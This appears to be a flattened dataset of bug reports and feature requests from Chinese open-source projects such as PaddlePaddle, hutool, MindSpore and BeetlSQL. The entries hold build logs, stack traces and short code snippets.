Fix sgd learing_rate problem,"problem some optimizer operator may change learning_rate during training, so learning_rate should be a tensor in scope. In the formal PR, we move the learning_rate from attribute to tensor, but we just get it like This will have problem when the Tensor is a GPUTensor because we can't directly get value from GPUTensor. way to fix use Eigen tensor to represent the learning_rata and let Eigen do the computation but not get it's value as float.   <code>: float lr = ctx.Input&lt;Tensor&gt;(""LearningRate"")-&gt;data&lt;float&gt;()[0];"
" ZipUtil.zip(OutputStream out, String[] paths, InputStream[] ins) 压缩大文件堆内存溢出","JDK版本： 1.8.0_311 hutool版本： 5.8.9（最新尝试还有问题） 调用ZipUtil.zip()方法压缩多个大文件时报堆内存溢出,小文件正常. java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3236) at java.io.ByteArrayOutputStream.grow(ByteArrayOutputStream.java:118) at java.io.ByteArrayOutputStream.ensureCapacity(ByteArrayOutputStream.java:93) at java.io.ByteArrayOutputStream.write(ByteArrayOutputStream.java:153) at java.util.zip.DeflaterOutputStream.deflate(DeflaterOutputStream.java:253) at java.util.zip.DeflaterOutputStream.write(DeflaterOutputStream.java:211) at java.util.zip.ZipOutputStream.write(ZipOutputStream.java:331) at cn.hutool.core.io.copy.StreamCopier.doCopy(StreamCopier.java:102) at cn.hutool.core.io.copy.StreamCopier.copy(StreamCopier.java:68) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:162) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:146) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:132) at cn.hutool.core.io.IoUtil.copy(IoUtil.java:119) at cn.hutool.core.compress.ZipWriter.putEntry(ZipWriter.java:275) at cn.hutool.core.compress.ZipWriter.add(ZipWriter.java:177) at cn.hutool.core.compress.ZipWriter.add(ZipWriter.java:199) at cn.hutool.core.util.ZipUtil.zip(ZipUtil.java:420) at cn.hutool.core.util.ZipUtil.zip(ZipUtil.java:406) at TestOBS.test(TestOBS.java:84) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63)   <code>: public void test() throws IOException { int i=0; InputStream[] is= new InputStream[6]; String[] fileNames=new String[6]; ByteArrayOutputStream outputStream=new ByteArrayOutputStream(); while (i&lt;6) { File file = new File(""D:\\t\\Downloads\\Downloads1.rar"");//文件大小1G FileInputStream input = new FileInputStream(file); is[i]=input; fileNames[i]=""sas""+i; i++; } ZipUtil.zip(outputStream, fileNames, is); }"
在麒麟v10 上编译安装飞浆 安装到第八步命令 执行cmake： Python3    不能成功执行 cpu 是 鲲鹏k920,"Determining if the pthread_create exist failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_f6dbc/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_f6dbc.dir/build.make CMakeFiles/cmTC_f6dbc.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building C object CMakeFiles/cmTC_f6dbc.dir/CheckSymbolExists.c.o /usr/bin/cc -o CMakeFiles/cmTC_f6dbc.dir/CheckSymbolExists.c.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/CheckSymbolExists.c Linking C executable cmTC_f6dbc /usr/bin/cmake -E cmake_link_script CMakeFiles/cmTC_f6dbc.dir/link.txt --verbose=1 /usr/bin/cc CMakeFiles/cmTC_f6dbc.dir/CheckSymbolExists.c.o -o cmTC_f6dbc /usr/bin/ld: CMakeFiles/cmTC_f6dbc.dir/CheckSymbolExists.c.o: in function pthread_create' /usr/bin/ld: CheckSymbolExists.c:(.text+0x18): undefined reference to `pthread_create' collect2: 错误：ld 返回 1 gmake[1]: *** [CMakeFiles/cmTC_f6dbc.dir/build.make:87：cmTC_f6dbc] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_f6dbc/fast] 错误 2 File /root/Paddle/build/CMakeFiles/CMakeTmp/CheckSymbolExists.c: /* */ #include &lt;pthread.h&gt; int main(int argc, char** argv) { (void)argv; #ifndef pthread_create return ((int*)(&amp;pthread_create))[argc]; #else (void)argc; return 0; #endif } Determining if the function pthread_create exists in the pthreads failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_343ab/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_343ab.dir/build.make CMakeFiles/cmTC_343ab.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building C object CMakeFiles/cmTC_343ab.dir/CheckFunctionExists.c.o /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create -o CMakeFiles/cmTC_343ab.dir/CheckFunctionExists.c.o -c /usr/share/cmake/Modules/CheckFunctionExists.c Linking C executable cmTC_343ab /usr/bin/cmake -E cmake_link_script CMakeFiles/cmTC_343ab.dir/link.txt --verbose=1 /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create CMakeFiles/cmTC_343ab.dir/CheckFunctionExists.c.o -o cmTC_343ab -lpthreads /usr/bin/ld: 找不到 -lpthreads collect2: 错误：ld 返回 1 gmake[1]: *** [CMakeFiles/cmTC_343ab.dir/build.make:87：cmTC_343ab] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_343ab/fast] 错误 2 Performing C++ SOURCE FILE Test MMX_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_7ef29/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_7ef29.dir/build.make CMakeFiles/cmTC_7ef29.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_7ef29.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DMMX_FOUND -mmmx -o CMakeFiles/cmTC_7ef29.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-mmmx’ gmake[1]: *** [CMakeFiles/cmTC_7ef29.dir/build.make:66：CMakeFiles/cmTC_7ef29.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_7ef29/fast] 错误 2 Return value: 1 Source file was: #include &lt;mmintrin.h&gt; int main() { _mm_setzero_si64(); return 0; } Performing C++ SOURCE FILE Test SSE2_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_388c0/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_388c0.dir/build.make CMakeFiles/cmTC_388c0.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_388c0.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DSSE2_FOUND -msse2 -o CMakeFiles/cmTC_388c0.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-msse2’ gmake[1]: *** [CMakeFiles/cmTC_388c0.dir/build.make:66：CMakeFiles/cmTC_388c0.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_388c0/fast] 错误 2 Return value: 1 Source file was: #include &lt;emmintrin.h&gt; int main() { _mm_setzero_si128(); return 0; } Performing C++ SOURCE FILE Test SSE3_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_1468e/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_1468e.dir/build.make CMakeFiles/cmTC_1468e.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_1468e.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DSSE3_FOUND -msse3 -o CMakeFiles/cmTC_1468e.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-msse3’ gmake[1]: *** [CMakeFiles/cmTC_1468e.dir/build.make:66：CMakeFiles/cmTC_1468e.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_1468e/fast] 错误 2 Return value: 1 Source file was: #include &lt;pmmintrin.h&gt; int main() { __m128d a = _mm_set1_pd(6.28); __m128d b = _mm_set1_pd(3.14); __m128d result = _mm_addsub_pd(a, b); result = _mm_movedup_pd(result); return 0; } Performing C++ SOURCE FILE Test AVX_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_66be1/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_66be1.dir/build.make CMakeFiles/cmTC_66be1.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_66be1.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DAVX_FOUND -mavx -o CMakeFiles/cmTC_66be1.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-mavx’ gmake[1]: *** [CMakeFiles/cmTC_66be1.dir/build.make:66：CMakeFiles/cmTC_66be1.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_66be1/fast] 错误 2 Return value: 1 Source file was: #include &lt;immintrin.h&gt; int main() { __m256 a = _mm256_set_ps (-1.0f, 2.0f, -3.0f, 4.0f, -1.0f, 2.0f, -3.0f, 4.0f); __m256 b = _mm256_set_ps (1.0f, 2.0f, 3.0f, 4.0f, 1.0f, 2.0f, 3.0f, 4.0f); __m256 result = _mm256_add_ps (a, b); return 0; } Performing C++ SOURCE FILE Test AVX2_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_a0b86/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_a0b86.dir/build.make CMakeFiles/cmTC_a0b86.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_a0b86.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DAVX2_FOUND -mavx2 -o CMakeFiles/cmTC_a0b86.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-mavx2’ gmake[1]: *** [CMakeFiles/cmTC_a0b86.dir/build.make:66：CMakeFiles/cmTC_a0b86.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_a0b86/fast] 错误 2 Return value: 1 Source file was: #include &lt;immintrin.h&gt; int main() { __m256i a = _mm256_set_epi32 (-1, 2, -3, 4, -1, 2, -3, 4); __m256i result = _mm256_abs_epi32 (a); return 0; } Performing C++ SOURCE FILE Test AVX512F_FOUND failed with the following output: Change Dir: /root/Paddle/build/CMakeFiles/CMakeTmp Run Build Command:""/usr/bin/gmake"" ""cmTC_e88f8/fast"" /usr/bin/gmake -f CMakeFiles/cmTC_e88f8.dir/build.make CMakeFiles/cmTC_e88f8.dir/build gmake[1]: 进入目录“/root/Paddle/build/CMakeFiles/CMakeTmp” Building CXX object CMakeFiles/cmTC_e88f8.dir/src.cxx.o /usr/bin/c++ -Wno-error=deprecated-declarations -Wno-deprecated-declarations -DAVX512F_FOUND -mavx512f -o CMakeFiles/cmTC_e88f8.dir/src.cxx.o -c /root/Paddle/build/CMakeFiles/CMakeTmp/src.cxx c++: 错误：unrecognized command line option ‘-mavx512f’ gmake[1]: *** [CMakeFiles/cmTC_e88f8.dir/build.make:66：CMakeFiles/cmTC_e88f8.dir/src.cxx.o] 错误 1 gmake[1]: 离开目录“/root/Paddle/build/CMakeFiles/CMakeTmp” gmake: *** [Makefile:121：cmTC_e88f8/fast] 错误 2 Return value: 1 Source file was: #include &lt;immintrin.h&gt; int main() { __m512i a = _mm512_set_epi32 (-1, 2, -3, 4, -1, 2, -3, 4, 13, -5, 6, -7, 9, 2, -6, 3); __m512i result = _mm512_abs_epi32 (a); return 0; }   <code>: main': CheckSymbolExists.c:(.text+0x14): undefined reference to"
【众智】【计算-AICPU接入】Conj,"AICPU算子接入 返回复数的共轭复数。 input output 仅增加了AICPU对cp64、cp128的支持，CPU保持不变 对应底层算子 对应底层AICPU算子Conj: @ops.RegisterGradient(""Conj"")   <code>: class Conj(Primitive):"
"[CT][MS][OP]When the Cholesky operator is non SPD, the error information is not clear",": Ascend,CPU /device cpu : -- MindSpore version : -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_cholesky.py 切换不同的模式： export CONTEXT_MODE='PYNATIVE_MODE' export CONTEXT_MODE='GRAPH_MODE' 进行用例测试： pytest -s operations/test_cholesky.py::test_cholesky_with_non_spd_input pytest -s operations/test_cholesky.py::test_cholesky_with_non_spd_input 这个异常用例报错信息不清晰，需开发人员对报错信息进行清晰的定义。 1.希望test_cholesky_with_non_spd_input的报错信息清晰 ascend上的pynative模式，报错信息如下：   <code>: def test_cholesky_with_non_spd_input(): input1 = np.random.uniform(1, 3, size=[3, 3]) input_x = Tensor(input1.astype(np.float32)) fact = CholeskyMock(attributes={'upper': False}, inputs=[input_x]) # with pytest.raises((RuntimeError, ValueError)): fact.forward_cmp()"
laydate 在js.layer.open里使用不行,最后这样弄了一下，可以 然后在js.layer.open里的success里可以调用js.laydate.render({})；   <code>: 在common.js里加上 // 自定义js.laydate js.laydate = function() { try { if (top.laydate) return top.laydate; if (parent.parent.laydate) return parent.parent.laydate; if (parent.laydate) return parent.laydate } catch (d) {} return js.laydate ? laydate : null }();
【权限扩展】用户不在pigxx数据库，在业务数据库demo一张表中时，如何进行Oauth认证,pigx版本: 3.4.0 是否修改包名: 否   <code>: pigxx数据库里的sys_user表作为后台管理员用户，商城会员用demo数据库的member表。 系统有的业务数据库demo里有一张【member（会员表）】，如何实现会员登录？ 虽然看到如下解答： #162 但是仍然有疑惑： 1.难道要在pigx项目里连接demo数据库查询【会员表】？ 2.在新建的微服务里如何实现member用户的登录授权？
"Openssl生成的SM2私钥，公钥无法使用SmUtil.sm2(priKey, pubKey);实例化","JDK版本： openjdk_8_201 hutool版本： 5.5.8 bcprov-jdk15on版本： 1.68 openssl生成的sm2公钥或者私钥无法使用SmUtil实例化 String priKey = ""MHcCAQEEIE29XqAFV/rkJbnJzCoQRJLTeAHG2TR0h9ZCWag0+ZMEoAoGCCqBHM9VAYItoUQDQgAESkOzNigIsH5ehFvr9yQNQ66genyOrm+Q4umCA4aWXPeRzmcTAWSlTineiReTFN2lqor2xaulT8u3a4w3AM/F6A==""; String pubKey = ""MFkwEwYHKoZIzj0CAQYIKoEcz1UBgi0DQgAESkOzNigIsH5ehFvr9yQNQ66genyOrm+Q4umCA4aWXPeRzmcTAWSlTineiReTFN2lqor2xaulT8u3a4w3AM/F6A==""; InvalidKeySpecException: encoded key spec not recognized: unknown object in getInstance: org.bouncycastle.asn1.DEROctetString   <code>: SM2 sm2 = SmUtil.sm2(priKey, pubKey);"
建议扩展LambdaQuery，提供对sqlId或Sql的支持,"当前LambdaQuery仅支持单表查询。有些场景，我们有定义一个固定的sql，如事实表，然后对事实表进行不同维度/类型的组合查询。若支持任意查询sql的lambda，写代码会方便很多。 建议增加以下扩展： 实现方式： 扩展LambdaQuery.getTableName方法，拼接""( sql ) t""形式输出，最终的sql类似： 下方是扩展的LambdaQuery，供参考：   <code>: // SQLManager扩展 sqlManager.lambdaQuery(sqlId, clazz); sqlManager.lambdaQuery(sqlId, paras, clazz); sqlManager.lambdaQuery(new SQLReady(sql, paras), clazz); // BaseMapper扩展 public interfact ExampleDao extends BaseMapper { LambdaQuery&lt;Example&gt; example1(); @Sql(value=""select sql..."") LambdaQuery&lt;Example&gt; example2(); } SELECT `id`, `name` FROM ( select * FROM `beetl` where 1=1 ) t WHERE `id` = ? public class BetterLambdaQuery&lt;T&gt; extends LambdaQuery&lt;T&gt; { private String sqlId; private Object paras; public BetterLambdaQuery(SQLManager sqlManager, Class&lt;?&gt; clazz, String sqlId) { this(sqlManager, clazz, sqlId, null); } public BetterLambdaQuery(SQLManager sqlManager, Class&lt;?&gt; clazz, String sqlId, Object paras) { super(sqlManager, clazz); this.sqlId = sqlId; this.paras = paras; } @Override public String getTableName(Class&lt;?&gt; c) { SQLResult sqlResult = this.sqlManager.getSQLResult(sqlId, paras); // 将sqlId的查询参数增加在前面 getParams().addAll(0, Arrays.asList(sqlResult.toObjectArray())); //拼接sql： ( sql ) t return new StringBuilder(""( "").append(sqlResult.jdbcSql).append("" ) t"").toString(); } } // 使用例子 LambdaQuery&lt;Clazz&gt; query = new BetterLambdaQuery&lt;&gt;(sqlManager, Clazz.class, ""sqlId"");"
关于定时任务执行报错,Caused by: java.lang.NullPointerException at com.performance.web.controller.system.performanceManage.CenterFillDataController.autoConfirmxmryInfo(CenterFillDataController.java:618) ... 9 more (String) 经查是因为有一条查询数据的sql执行较慢（大概5秒左右）导致报错，请问在无法优化SQL的前提下，有什么办法可以解决   <code>: at com.performance.quartz.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:61) at com.performance.quartz.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:38) at com.performance.quartz.util.QuartzDisallowConcurrentExecution.doExecute(QuartzDisallowConcurrentExecution.java:19) at com.performance.quartz.util.AbstractQuartzJob.execute(AbstractQuartzJob.java:43) at org.quartz.core.JobRunShell.run(JobRunShell.java:202) at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:573)
添加用户问题,"应为   <code>: &lt;input class=""form-control input-md"" type=""text"" name=""user.mobile"" value=""${(user.mobile)!}""&gt; &lt;input class=""form-control input-md"" type=""text"" name=""user.phone"" value=""${(user.phone)!}""&gt;"
能否添加类似Guava的Functions或Predicates这样的函数式接口工具类？,"能否添加类似 Guava 的 或 这样的函数式接口工具类？ 日常使用中，经常在会有一些需要对 取反的情况： 如果使用 Guava 的 则可以写成： 或者有时候也会有一些需要对函数式接口进行组合的情况： 如果使用 则可以简化为： 此外，有时候也会用到一些 或者 这样的函数式接口，大概看了一下， 好像没有这方面的工具类，作者有考虑补充一下这方面的功能吗？   <code>: Functions Predicates Predicate Set&lt;String&gt; sets = CollUtil.newHashSet(""1"", ""2"", ""3"") Stream.of(""3"", ""4"", ""5"") .filter(t -&gt; !sets.contains(t)) .collect(Collectors.toList*()) Predicates Stream.of(""3"", ""4"", ""5"") .filter(Predicates.not(sets::contains)) .collect(Collectors.toList*()) Stream.of(""3"", ""4"", ""5"") .filter(t -&gt; sets.contains(Integer.valueOf(t))) .collect(Collectors.toList*()) Functions Stream.of(""3"", ""4"", ""5"") .filter(Functions.compose(Sets::contains, Integer::valueOf)) .collect(Collectors.toList*()) doNothing alwaysTrue hutool"
[CT][MS][ExtractGlimpse] ExtractGlimpse has some problems at ascend and cpu,"1，检查算子说明说明， 说法错误，少了 gaussian zero /mode graph   <code>: def test_extractglimpse_input_dimension_not_equal(): input_list = [] input_list.append(Tensor(np.random.randn(8, 4, 2, 3), dtype=mstype.float32)) input_list.append(Tensor(np.array([2, 2]), dtype=mstype.int32)) input_list.append(Tensor(np.array([[0, 0]]), dtype=mstype.float32)) fact = ExtractGlimpseMock( attributes={'centered': True, 'normalize': True, 'uniform_noise': True, 'noise': 'uniform'}, inputs=input_list) # with pytest.raises((ValueError, RuntimeError)): fact.forward_mindspore_impl() &gt; fact.forward_cmp() fact.forward_cmp() def test_extractglimpse_input_input_not_tensor(): input_x = ""test"" size = Tensor(np.random.randint(2, 10, size=(2)), dtype=mstype.int32) offsets = Tensor(np.random.randn(1, 2), dtype=mstype.float32) net = ExtractGlimpse(size_=input_x, centered=True, normalized=True, uniform_noise=True, noise='uniform') fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(size, offsets) test_extractglimpse.py:543: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:437: in __call__ return self.net(*args) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:604: in __call__ raise err /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:600: in __call__ output = self._run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:417: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/extractglimpse_ops.py:26: in construct return self.ss(x, self.size, offsets) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:294: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/common/api.py:93: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[ExtractGlimpse]&lt;centered=True, normalized=True, uniform_noise=True, noise=uniform, cust_aicpu=ExtractGlimpse&gt;, op_name = 'ExtractGlimpse' args = (Tensor(shape=[2], dtype=Int32, value= [6, 5]), 'test', Tensor(shape=[1, 2], dtype=Float32, value= [[ 8.02744448e-01, 2.57639229e-01]])) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E TypeError: mindspore/core/utils/check_convert_utils.cc:637 CheckTensorSubClass] For primitive[ExtractGlimpse], the input argument[input] must be a type of { Tensor[Float32],}, but got Tensor[Int32]. def test_extractglimpse_input_size_not_tensor(): input_x = Tensor(np.random.randn(1, 4, 2, 3), dtype=mstype.float32) size = (2, 2) offsets = Tensor(np.random.randn(1, 2), dtype=mstype.float32) net = ExtractGlimpse(size_=input_x, centered=True, normalized=True, uniform_noise=True, noise='uniform') fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(size, offsets) test_extractglimpse.py:562: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:437: in __call__ return self.net(*args) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:604: in __call__ raise err /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:600: in __call__ output = self._run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:417: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/extractglimpse_ops.py:26: in construct return self.ss(x, self.size, offsets) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:294: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/common/api.py:93: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[ExtractGlimpse]&lt;centered=True, normalized=True, uniform_noise=True, noise=uniform, cust_aicpu=ExtractGlimpse&gt;, op_name = 'ExtractGlimpse' args = ((2, 2), Tensor(shape=[1, 4, 2, 3], dtype=Float32, value= [[[[-1.35152876e-01, 1.09997523e+00, 6.03084683e-01], [...9.50208843e-01, 2.23133922e-01]]]]), Tensor(shape=[1, 2], dtype=Float32, value= [[ 2.12318873e+00, 5.75078189e-01]])) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E TypeError: mindspore/core/utils/check_convert_utils.cc:541 CheckTensorTypeValid] For Primitive[ExtractGlimpse], the input argument[input] must be a Tensor but got Tuple[Int64*2]. bool True def test_extractglimpse_input_uniform_noise_true_noise_zero(): input_list = [] input_list.append(Tensor(np.random.randn(1, 4, 2, 3), dtype=mstype.float32)) input_list.append(Tensor(np.random.randint(2, 10, size=(2)), dtype=mstype.int32)) input_list.append(Tensor(np.random.randn(1, 2), dtype=mstype.float32)) attributes = {'centered': False, 'normalize': True, 'uniform_noise': True, 'noise': 'zero'} fact = ExtractGlimpseMock(attributes=attributes, inputs=input_list) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt; def test_extractglimpse_input_uniform_noise_false_noise_uniform(): input_list = [] input_list.append(Tensor(np.random.randn(1, 4, 2, 3), dtype=mstype.float32)) input_list.append(Tensor(np.random.randint(2, 10, size=(2)), dtype=mstype.int32)) input_list.append(Tensor(np.random.randn(1, 2), dtype=mstype.float32)) attributes = {'centered': False, 'normalize': True, 'uniform_noise': False, 'noise': 'uniform'} fact = ExtractGlimpseMock(attributes=attributes, inputs=input_list) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() test_extractglimpse.py:619: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/extractglimpse_ops.py:56: in forward_mindspore_impl out = net(self.input_x, self.input_offsets) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:604: in __call__ raise err /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:601: in __call__ _pynative_executor.end_graph(self, output, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0x7f8b13757110&gt;, obj = WrapOp&lt;&gt; output = Tensor(shape=[1, 3, 2, 3], dtype=Float32, value= [[[[ 6.27397895e-01, 1.81330204e-01, -2.55855322e-02], [ 2.668949...1]], [[ 4.78653550e-01, 2.18346357e-01, -6.82119250e-01], [ 6.59983397e-01, 3.31348777e-01, -3.76245260e-01]]]]) args = (Tensor(shape=[1, 4, 2, 3], dtype=Float32, value= [[[[ 1.49278200e+00, -1.35956490e+00, 1.14741147e+00], [ 3.02574...3.22160900e-01, -6.63875222e-01]]]]), Tensor(shape=[1, 2], dtype=Float32, value= [[-7.26581737e-02, -2.26058289e-01]])) kwargs = {} def end_graph(self, obj, output, *args, **kwargs): """""" Clean resources after building forward and backward graph. Args: obj (Function/Cell): The function or cell instance. output (Tensor/tuple/list): Function or cell output object. args (tuple): Function or cell input arguments. kwargs (dict): keyword arguments. Return: None. """""" &gt; self._executor.end_graph(obj, output, *args, *(kwargs.values())) E RuntimeError: mindspore/ccsrc/plugin/device/cpu/kernel/extract_glimpse_cpu_kernel.cc:80 Necessity] noise type unsupported."
